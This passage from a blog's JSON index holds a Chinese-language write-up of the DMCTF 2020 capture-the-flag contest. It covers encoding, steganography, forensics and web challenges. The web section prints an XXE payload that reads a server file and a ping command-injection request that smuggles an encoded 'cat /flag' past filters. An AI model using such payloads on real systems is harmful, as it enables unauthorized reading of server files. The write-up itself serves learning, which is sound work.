Pages需要加载时间，上传之后可能不会立刻解析，等待一段时间后，即可看到博客。","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"DMCTF WriteUp","slug":"DMCTF-WriteUp","date":"2020-11-28T03:22:55.000Z","updated":"2021-02-24T12:57:21.081Z","comments":true,"path":"2020/11/28/dmctf-writeup/","link":"","permalink":"http://example.com/2020/11/28/dmctf-writeup/","excerpt":"","text":"MISCCheck Indmctf{Welcome_to_dmctf2020} 签到题 fakezipzip伪加密 WinHex打开，修改加密位 image-20201123231732236 修改为00 00，保存 image-20201123231807913 解压出来，是一个flag.txt 音乐符号加密 文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn) image-20201201211132655 flag{da1ada1a} Base familyXUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td”^w$Q8+8T])e.llK?zgS:+C]llUG:z1=ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;duRBGjg0!I+xjm(fh)]IF:&gt;omN8=m+Xp(X0:U8Sj5|8p.o[i0:%.qu}%=&lt;D CTF在线工具-在线base91编码|在线base91解码|base91编码|base91解码 (ssleye.com) image-20201201211208097 13G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW CTF在线工具-在线base58编码|在线base58解码|base58编码|base58解码|base58check (ssleye.com) image-20201201211237142 1JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5 CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (ssleye.com) image-20201201211255379 1NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q&#x3D; image-20201201211311550 1666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d 小写转大写，Base16 666C61677B7930755F616C72336164795F6B6E30775F7468335F4261736566616D316C797D image-20201128104036120 1flag&#123;y0u_alr3ady_kn0w_th3_Basefam1ly&#125; SlientEye image-20201128105301975 image-20201128112731115 HTML解码 - 在线HTML解码器 (convertstring.com) image-20201128112815875 flag{n1_bu_j1ang_wu_d3} 编码之王 image-20201128180130844 社会主义核心价值观编码 CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (ssleye.com) image-20201128180242480 佛曰编码 与佛论禅 (keyfc.net) image-20201128180304253 新佛曰编码 新约佛论禅/佛曰加密 - PcMoe! image-20201128180337119 Jsfuck编码 浏览器控制台解码 image-20201128180449828 DMCTF{Wow_you_kn0w_more_eNcoding} jpgsteg 这道题用了JPHS这个工具 image-20201201212404922 这里让我们输入密码，根据题目的提示，盲猜123456（虽然我是问大佬的。。。） 分离出一个文本 image-20201201212719773 敲击码，对应图片名称Tap Code 按照表解码 image-20201201212823509 flag{ohhamazing} Collision根据题目名字可以大致猜出用CRC32碰撞，然后上脚本跑就可以 脚本如下 1234567891011121314151617181920#PYTHON2from zlib import crc32import randomchar=&#x27;0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&#x27;# char=&#x27;0123456789&#x27;def crc32_f(data): return hex(crc32(data)&amp;0xffffffff)[2:10]length=input(&#x27;length:&#x27;)crc32_=raw_input(&#x27;crc32:&#x27;).lower()while True: text=&#x27;&#x27; for i in range(length): text+=char[random.randint(0,len(char)-1)] if crc32_f(text)==crc32_: raw_input(&#x27;find it:&#x27;+text) exit CRC32用WinRAR查看 image-20201128181028337 image-20201128181552152 flag{crc32collis1on} kaomoji flag.zip里面有个secret.txt，盲猜是明文 image-20201128182054222 image-20201128183314882 image-20201128185910688 浏览器控制台直接解密 image-20201128191119983 flag{kaomoj1_1s_cut3} ARCHPR image-20201128191710927 image-20201128191655160 image-20201128191538682 image-20201128191749702 CTF在线工具-在线莫尔斯电码编码|在线莫尔斯电码解码|莫尔斯电码算法|Morse (ssleye.com) image-20201128192150442 image-20201128192342062 image-20201128192402961 flag{th1s_15_f1agggggg} outguess image-20201128192932243 image-20201128192951386 Online calculator: Caesar cipher (planetcalc.com) image-20201128193113033 在线AES加密 | AES解密 - 在线工具 (sojson.com) image-20201128193235290 flag{y0u_ar3_awes0m3} Whitespace image-20201201213113170 下载下来的压缩包需要密码，在注释里面，Whitespace Whitelips the Whitespace IDE (vii5ard.github.io) 在线IDE，运行程序 image-20201201213335829 解压出来是两张图片和一个hint.txt image-20201201213521455 盲水印 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218#!/usr/bin/env python3# -*- coding: utf8 -*-import sysimport randomcmd = Nonedebug = Falseseed = 20160930oldseed = Falsealpha = 3.0if __name__ == &#x27;__main__&#x27;: if &#x27;-h&#x27; in sys.argv or &#x27;--help&#x27; in sys.argv or len(sys.argv) &lt; 2: print (&#x27;Usage: python bwm.py &lt;cmd&gt; [arg...] [opts...]&#x27;) print (&#x27; cmds:&#x27;) print (&#x27; encode &lt;image&gt; &lt;watermark&gt; &lt;image(encoded)&gt;&#x27;) print (&#x27; image + watermark -&gt; image(encoded)&#x27;) print (&#x27; decode &lt;image&gt; &lt;image(encoded)&gt; &lt;watermark&gt;&#x27;) print (&#x27; image + image(encoded) -&gt; watermark&#x27;) print (&#x27; opts:&#x27;) print (&#x27; --debug, Show debug&#x27;) print (&#x27; --seed &lt;int&gt;, Manual setting random seed (default is 20160930)&#x27;) print (&#x27; --oldseed Use python2 random algorithm.&#x27;) print (&#x27; --alpha &lt;float&gt;, Manual setting alpha (default is 3.0)&#x27;) sys.exit(1) cmd = sys.argv[1] if cmd != &#x27;encode&#x27; and cmd != &#x27;decode&#x27;: print (&#x27;Wrong cmd %s&#x27; % cmd) sys.exit(1) if &#x27;--debug&#x27; in sys.argv: debug = True del sys.argv[sys.argv.index(&#x27;--debug&#x27;)] if &#x27;--seed&#x27; in sys.argv: p = sys.argv.index(&#x27;--seed&#x27;) if len(sys.argv) &lt;= p+1: print (&#x27;Missing &lt;int&gt; for --seed&#x27;) sys.exit(1) seed = int(sys.argv[p+1]) del sys.argv[p+1] del sys.argv[p] if &#x27;--oldseed&#x27; in sys.argv: oldseed = True del sys.argv[sys.argv.index(&#x27;--oldseed&#x27;)] if &#x27;--alpha&#x27; in sys.argv: p = sys.argv.index(&#x27;--alpha&#x27;) if len(sys.argv) &lt;= p+1: print (&#x27;Missing &lt;float&gt; for --alpha&#x27;) sys.exit(1) alpha = float(sys.argv[p+1]) del sys.argv[p+1] del sys.argv[p] if len(sys.argv) &lt; 5: print (&#x27;Missing arg...&#x27;) sys.exit(1) fn1 = sys.argv[2] fn2 = sys.argv[3] fn3 = sys.argv[4]import cv2import numpy as npimport matplotlib.pyplot as plt# OpenCV是以(BGR)的顺序存储图像数据的# 而Matplotlib是以(RGB)的顺序显示图像的def bgr_to_rgb(img): b, g, r = cv2.split(img) return cv2.merge([r, g, b])if cmd == &#x27;encode&#x27;: print (&#x27;image&lt;%s&gt; + watermark&lt;%s&gt; -&gt; image(encoded)&lt;%s&gt;&#x27; % (fn1, fn2, fn3)) img = cv2.imread(fn1) wm = cv2.imread(fn2) if debug: plt.subplot(231), plt.imshow(bgr_to_rgb(img)), plt.title(&#x27;image&#x27;) plt.xticks([]), plt.yticks([]) plt.subplot(234), plt.imshow(bgr_to_rgb(wm)), plt.title(&#x27;watermark&#x27;) plt.xticks([]), plt.yticks([]) # print img.shape # 高, 宽, 通道 h, w = img.shape[0], img.shape[1] hwm = np.zeros((int(h * 0.5), w, img.shape[2])) assert hwm.shape[0] &gt; wm.shape[0] assert hwm.shape[1] &gt; wm.shape[1] hwm2 = np.copy(hwm) for i in range(wm.shape[0]): for j in range(wm.shape[1]): hwm2[i][j] = wm[i][j] if oldseed: random.seed(seed,version=1) else: random.seed(seed) m, n = list(range(hwm.shape[0])), list(range(hwm.shape[1])) if oldseed: random.shuffle(m,random=random.random) random.shuffle(n,random=random.random) else: random.shuffle(m) random.shuffle(n) for i in range(hwm.shape[0]): for j in range(hwm.shape[1]): hwm[i][j] = hwm2[m[i]][n[j]] rwm = np.zeros(img.shape) for i in range(hwm.shape[0]): for j in range(hwm.shape[1]): rwm[i][j] = hwm[i][j] rwm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = hwm[i][j] if debug: plt.subplot(235), plt.imshow(bgr_to_rgb(rwm)), \\ plt.title(&#x27;encrypted(watermark)&#x27;) plt.xticks([]), plt.yticks([]) f1 = np.fft.fft2(img) f2 = f1 + alpha * rwm _img = np.fft.ifft2(f2) if debug: plt.subplot(232), plt.imshow(bgr_to_rgb(np.real(f1))), \\ plt.title(&#x27;fft(image)&#x27;) plt.xticks([]), plt.yticks([]) img_wm = np.real(_img) assert cv2.imwrite(fn3, img_wm, [int(cv2.IMWRITE_JPEG_QUALITY), 100]) # 这里计算下保存前后的(溢出)误差 img_wm2 = cv2.imread(fn3) sum = 0 for i in range(img_wm.shape[0]): for j in range(img_wm.shape[1]): for k in range(img_wm.shape[2]): sum += np.power(img_wm[i][j][k] - img_wm2[i][j][k], 2) miss = np.sqrt(sum) / (img_wm.shape[0] * img_wm.shape[1] * img_wm.shape[2]) * 100 print (&#x27;Miss %s%% in save&#x27; % miss) if debug: plt.subplot(233), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \\ plt.title(&#x27;image(encoded)&#x27;) plt.xticks([]), plt.yticks([]) f2 = np.fft.fft2(img_wm) rwm = (f2 - f1) / alpha rwm = np.real(rwm) wm = np.zeros(rwm.shape) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[m[i]][n[j]] = np.uint8(rwm[i][j]) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = wm[i][j] if debug: assert cv2.imwrite(&#x27;_bwm.debug.wm.jpg&#x27;, wm) plt.subplot(236), plt.imshow(bgr_to_rgb(wm)), plt.title(u&#x27;watermark&#x27;) plt.xticks([]), plt.yticks([]) if debug: plt.show()elif cmd == &#x27;decode&#x27;: print (&#x27;image&lt;%s&gt; + image(encoded)&lt;%s&gt; -&gt; watermark&lt;%s&gt;&#x27; % (fn1, fn2, fn3)) img = cv2.imread(fn1) img_wm = cv2.imread(fn2) if debug: plt.subplot(231), plt.imshow(bgr_to_rgb(img)), plt.title(&#x27;image&#x27;) plt.xticks([]), plt.yticks([]) plt.subplot(234), plt.imshow(bgr_to_rgb(img_wm)), plt.title(&#x27;image(encoded)&#x27;) plt.xticks([]), plt.yticks([]) if oldseed: random.seed(seed,version=1) else: random.seed(seed) m, n = list(range(int(img.shape[0] * 0.5))), list(range(img.shape[1])) if oldseed: random.shuffle(m,random=random.random) random.shuffle(n,random=random.random) else: random.shuffle(m) random.shuffle(n) f1 = np.fft.fft2(img) f2 = np.fft.fft2(img_wm) if debug: plt.subplot(232), plt.imshow(bgr_to_rgb(np.real(f1))), \\ plt.title(&#x27;fft(image)&#x27;) plt.xticks([]), plt.yticks([]) plt.subplot(235), plt.imshow(bgr_to_rgb(np.real(f1))), \\ plt.title(&#x27;fft(image(encoded))&#x27;) plt.xticks([]), plt.yticks([]) rwm = (f2 - f1) / alpha rwm = np.real(rwm) if debug: plt.subplot(233), plt.imshow(bgr_to_rgb(rwm)), \\ plt.title(&#x27;encrypted(watermark)&#x27;) plt.xticks([]), plt.yticks([]) wm = np.zeros(rwm.shape) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[m[i]][n[j]] = np.uint8(rwm[i][j]) for i in range(int(rwm.shape[0] * 0.5)): for j in range(rwm.shape[1]): wm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = wm[i][j] assert cv2.imwrite(fn3, wm) if debug: plt.subplot(236), plt.imshow(bgr_to_rgb(wm)), plt.title(u&#x27;watermark&#x27;) plt.xticks([]), plt.yticks([]) if debug: plt.show() image-20201201214323874 大小较大的那张作为有水印的图片 image-20201201214552082 hint里面还有一个是Manchester coding（曼彻斯特编码） 曼彻斯特编码解码器下载_曼彻斯特编码解码器官方下载-太平洋下载中心 (pconline.com.cn) 把图片左上角或右下角的都输入工具的第一个输入框中（十六进制），按照1-2-3的顺序点击按钮，得到的十六进制转ASCII image-20201201230355729 266C61677B61623164655F62795F7468335F6C61777D &amp;lag{ab1de_by_th3_law} flag{ab1de_by_th3_law} Steghide image-20201128193607663 image-20201128193633813 Ook编码，把¿ ¡改成? !，空格改成Ook [Brainfuck/Ook! Obfuscation/Encoding splitbrain.org] image-20201128194118981 flag{y0u_ar3_clev3r} SSTV[BUUCTF：UTCTF2020]sstv_末初-CSDN博客 类似做法，直接照着来就可以 QSSTV image-20201128194330674 DMCTF{SSTV,yyds?} 最简单的内存取证用volatility来做 首先识别系统 image-20201128195851478 扫描进程，看看有什么 image-20201128200303919 看不出什么东西，太菜了。。。 扫描文件 image-20201128200456659 有个flag.txt，提取出来 image-20201128202742202 image-20201128202805990 89504E47是PNG的文件头，用WinHex保存下来。 image-20201128202949377 是张缺了定位码的二维码，补全。 image-20201128203423490 DMCTF{Mem0ry_FoRensics+i5-vErY_1ntere5t1nG} SimpleQrcodegif，StegSolve分离 image-20201128204338956 image-20201128204257324 一张张扫，手动做法。 DMCTF{QrCode_1s_so_interesting!!!} WEBweak_type123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 &lt;?phpshow_source(__FILE__);include(&#x27;class.php&#x27;);//level1 if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;202020020&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===202020020)&#123; echo &quot;&lt;br&gt; level 1 Ok &lt;br&gt;&quot;; &#125;else&#123; die(&#x27;what are you doing?&#x27;); &#125;&#125;else&#123; die();&#125;//level 2if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if($v1 != $v2 &amp;&amp; md5($v1)==md5($v2))&#123; echo &quot;&lt;br&gt; level 2 Ok &lt;br&gt;&quot;; &#125;else&#123; die(&#x27;Are you kidding me ?&#x27;); &#125;&#125;else&#123; die();&#125;//level 3 if (isset($_POST[&#x27;message&#x27;])) &#123; $message = json_decode($_POST[&#x27;message&#x27;]); if ($message-&gt;key == $key) &#123; echo &quot;&lt;br&gt; Wow you got it !!! &lt;br&gt;&quot;; echo file_get_contents(&#x27;/flag&#x27;); &#125; else &#123; die(&quot;fail&quot;); &#125; &#125;else&#123; echo &quot;~~~~&quot;; &#125;Warning: include(class.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 4Warning: include(): Failed opening &#x27;class.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 4 代码审计 总共三个level image-20201128210929160 image-20201128211013711 image-20201128211142021 dmctf{80636ab6-aa36-4b73-8e92-c8bbeb2d1e1c} fungame image-20201128211344457 1var __encode =&#x27;jsjiami.com&#x27;,_a=&#123;&#125;, _0xb483=[&quot;\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65&quot;,&quot;\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x77\\x77\\x77\\x2E\\x73\\x6F\\x6A\\x73\\x6F\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x6F\\x62\\x66\\x75\\x73\\x63\\x61\\x74\\x6F\\x72\\x2E\\x68\\x74\\x6D\\x6C&quot;];(function(_0xd642x1)&#123;_0xd642x1[_0xb483[0]]= _0xb483[1]&#125;)(_a);var __Oxa2781=[&quot;&quot;,&quot;\\x2D\\x70\\x61\\x75\\x73\\x65\\x64\\x2D&quot;,&quot;\\x59\\x6F\\x75\\x20\\x57\\x69\\x6E\\x21\\x46\\x6C\\x61\\x67\\x20\\x44\\x4D\\x63\\x74\\x66\\x7B\\x66\\x6C\\x61\\x67\\x5F\\x69\\x73\\x5F\\x68\\x65\\x72\\x65\\x7D\\x21&quot;,&quot;\\x47\\x61\\x6D\\x65\\x20\\x4F\\x76\\x65\\x72\\x21&quot;,&quot;\\x50\\x72\\x65\\x73\\x73\\x20\\x45\\x73\\x63\\x61\\x70\\x65&quot;,&quot;\\x78&quot;,&quot;\\x79&quot;,&quot;\\x63\\x65\\x6E\\x74\\x65\\x72&quot;,&quot;\\x75\\x6E\\x64\\x65\\x66\\x69\\x6E\\x65\\x64&quot;,&quot;\\x6C\\x6F\\x67&quot;,&quot;\\u5220\\u9664&quot;,&quot;\\u7248\\u672C\\u53F7\\uFF0C\\x6A\\x73\\u4F1A\\u5B9A&quot;,&quot;\\u671F\\u5F39\\u7A97\\uFF0C&quot;,&quot;\\u8FD8\\u8BF7\\u652F\\u6301\\u6211\\u4EEC\\u7684\\u5DE5\\u4F5C&quot;,&quot;\\x6A\\x73\\x6A\\x69\\x61&quot;,&quot;\\x6D\\x69\\x2E\\x63\\x6F\\x6D&quot;];let bigText=__Oxa2781[0x0];if(paused)&#123;bigText= __Oxa2781[0x1]&#125;;if(winTimer.IsSet())&#123;bigText= __Oxa2781[0x2]&#125;;if(player.IsDead())&#123;bigText= __Oxa2781[0x3];DrawText(__Oxa2781[0x4],mainCanvasSize[__Oxa2781[0x5]]/ 2,mainCanvasSize[__Oxa2781[0x6]]/ 2+ 80,42)&#125;;DrawText(bigText,mainCanvasSize[__Oxa2781[0x5]]/ 2,mainCanvasSize[__Oxa2781[0x6]]/ 2- 80,72,__Oxa2781[0x7],2);;;(function(_0x5197x2,_0x5197x3,_0x5197x4,_0x5197x5,_0x5197x6,_0x5197x7)&#123;_0x5197x7= __Oxa2781[0x8];_0x5197x5= function(_0x5197x8)&#123;if( typeof alert!== _0x5197x7)&#123;alert(_0x5197x8)&#125;;if( typeof console!== _0x5197x7)&#123;console[__Oxa2781[0x9]](_0x5197x8)&#125;&#125;;_0x5197x4= function(_0x5197x9,_0x5197x2)&#123;return _0x5197x9+ _0x5197x2&#125;;_0x5197x6= _0x5197x4(__Oxa2781[0xa],_0x5197x4(_0x5197x4(__Oxa2781[0xb],__Oxa2781[0xc]),__Oxa2781[0xd]));try&#123;_0x5197x2= __encode;if(!( typeof _0x5197x2!== _0x5197x7&amp;&amp; _0x5197x2=== _0x5197x4(__Oxa2781[0xe],__Oxa2781[0xf])))&#123;_0x5197x5(_0x5197x6)&#125;&#125;catch(e)&#123;_0x5197x5(_0x5197x6)&#125;&#125;)(&#123;&#125;) 十六进制转ASCII image-20201128211910024 DMctf{flag_is_here} xxe1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE user [ &lt;!ENTITY abc SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;&amp;abc;&lt;/password&gt;&lt;/user&gt; image-20201128212255102 dmctf{a3d52192-34b4-43d6-87a2-ddca16395da1} pingpingping image-20201128212429907 1GET /ping.php?ip=127.0.0.1|`echo$IFS$1Y2F0IC9mbGFn$IFS$1|$IFS$1base64$IFS$1-d` HTTP/1.1 image-20201128212532930 dmctf{53325310-af8c-4490-92ae-7ea25c1ddebc}","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]}],"categories":[],"tags":[{"name":"教程","slug":"教程","permalink":"http://example.com/tags/%E6%95%99%E7%A8%8B/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"WriteUP","slug":"WriteUP","permalink":"http://example.com/tags/WriteUP/"},{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]}